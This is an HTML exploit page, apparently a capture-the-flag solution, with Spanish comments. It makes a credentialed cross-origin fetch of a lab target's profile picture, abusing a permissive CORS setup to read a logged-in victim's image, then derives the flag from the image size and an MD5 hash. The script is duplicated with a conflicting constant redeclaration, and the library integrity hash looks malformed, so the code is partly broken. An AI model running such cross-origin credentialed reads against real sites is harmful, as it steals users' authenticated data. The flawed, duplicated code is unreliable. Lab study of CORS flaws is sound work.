<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Demo lab: obtener tamaño imagen cooperativo</title>
</head>
<body>
  <h1>Demo cooperativa: obtener tamaño y MD5 del nivel</h1>
  <p>Haz click para intentar obtener la imagen desde p1 (solo funciona si p1 permite CORS y credenciales).</p>
  <button id="run">Pedir imagen y calcular nivel</button>

  <div id="result" style="margin-top:1em"></div>

  <script>
const P1_URL = 'https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic'; // reemplazar

async function hexFirstBytes(buffer, n = 8) {
  const view = new Uint8Array(buffer.slice(0, n));
  return Array.from(view).map(b => b.toString(16).padStart(2,'0')).join(' ');
}

document.getElementById('run').addEventListener('click', async () => {
  const out = document.getElementById('result');
  out.textContent = 'Solicitando imagen... (revisá la consola para debug)';
  try {
    const resp = await fetch(P1_URL, {
      method: 'GET',
      credentials: 'include' // OJO: si usás esto, el servidor debe devolver ACAO = origin y ACA-Credentials: true
    });

    console.log('HTTP status:', resp.status);
    console.log('Response headers:');
    for (const pair of resp.headers.entries()) console.log(pair[0], ':', pair[1]);

    if (!resp.ok) {
      out.textContent = `Error al obtener imagen: ${resp.status}`;
      return;
    }

    // leer arrayBuffer para inspeccionar bytes
    const buf = await resp.arrayBuffer();
    const contentLengthHeader = resp.headers.get('content-length');
    const contentTypeHeader = resp.headers.get('content-type');
    console.log('Content-Type header:', contentTypeHeader);
    console.log('Content-Length header:', contentLengthHeader);
    console.log('Buffer byteLength:', buf.byteLength);

    // Mostrar los primeros bytes (firma)
    const firstHex = await hexFirstBytes(buf, 8);
    console.log('Primeros bytes (hex):', firstHex); // Debe mostrar: 89 50 4e 47 0d 0a 1a 0a para PNG

    // Chequeo de coincidencia de tamaños (si header presente)
    if (contentLengthHeader) {
      const contentLen = parseInt(contentLengthHeader, 10);
      if (!Number.isNaN(contentLen) && contentLen !== buf.byteLength) {
        console.warn('Content-Length difiere de buffer.byteLength: posible truncado o transferencia incompleta.');
      }
    }

    // crear blob, forzando type si está vacío
    let mime = contentTypeHeader || 'image/png';
    const blob = new Blob([buf], { type: mime });
    console.log('Blob type:', blob.type, 'Blob size:', blob.size);

    // opción: descargar la imagen para inspeccionar localmente
    const downloadLink = document.createElement('a');
    downloadLink.href = URL.createObjectURL(blob);
    downloadLink.download = 'debug_profile_pic';
    downloadLink.textContent = 'Descargar imagen para inspeccionar';
    downloadLink.style.display = 'block';

    // renderizar en <img>
    const url = URL.createObjectURL(blob);
    const img = new Image();
    img.onload = () => {
      const width = img.naturalWidth;
      const height = img.naturalHeight;
      const level = width * height;
      out.innerHTML = `
        <p>Dimensiones: ${width} × ${height} px</p>
        <p>Nivel: ${level}</p>
        <p><img src="${url}" alt="imagen" style="max-width:300px; display:block; margin-top:8px"></p>
      `;
      out.appendChild(downloadLink);
      URL.revokeObjectURL(url);
    };
    img.onerror = (e) => {
      console.error('img.onerror', e);
      out.innerHTML = 'No se pudo cargar la imagen en el elemento <img>. Revisa la consola. ';
      out.appendChild(downloadLink);
      URL.revokeObjectURL(url);
    };
    img.src = url;

  } catch (err) {
    console.error('Error en fetch/render:', err);
    out.textContent = 'Error en la operación: ' + err;
  }
});
</script>
  <!-- MD5 desde CDN (blueimp-md5) - uso educativo en laboratorio controlado -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"
    integrity="sha512-6pQZfV+7wKk1gZ0bLq6cLfi0u7v2x9nJw6kKq5dB5qYq8Qf1X+v8zQ3x5k9Y6c4x5m3h0tLz8g3Jwq2YwqQ=="
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>

  <script>
    const P1_URL = 'https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic'; // reemplazar por tu p1

    document.getElementById('run').addEventListener('click', async () => {
      const out = document.getElementById('result');
      out.textContent = 'Solicitando imagen...';

      try {
        // Petición que envía cookies si p1 permite credentials
        const resp = await fetch(P1_URL, {
          method: 'GET',
          credentials: 'include' // envía cookies (solo si p1 y cookie lo permiten)
        });

        if (!resp.ok) {
          out.textContent = `Error al obtener la imagen: ${resp.status}`;
          return;
        }

        // Obtener blob y crear un objeto URL para asignar a Image
        const blob = await resp.blob();
        const url = URL.createObjectURL(blob);

        const img = new Image();
        img.onload = () => {
          const width = img.naturalWidth;
          const height = img.naturalHeight;
          const level = width * height;
          const md5hash = md5(String(level)); // usa la librería cargada desde CDN

          out.innerHTML =
            `<p>Dimensiones: ${width} × ${height} px</p>
             <p>Nivel: ${level}</p>
             <p>MD5(nivel): <code>${md5hash}</code></p>
             <p><img src="${url}" alt="imagen recibida" style="max-width:300px; display:block; margin-top:8px"></p>`;

          URL.revokeObjectURL(url);
        };

        img.onerror = () => {
          out.textContent = 'No se pudo cargar la imagen (posible problema de CORS o blob).';
          URL.revokeObjectURL(url);
        };

        img.src = url;

      } catch (err) {
        out.textContent = 'Error en la operación: ' + err;
      }
    });
  </script>
</body>
</html>
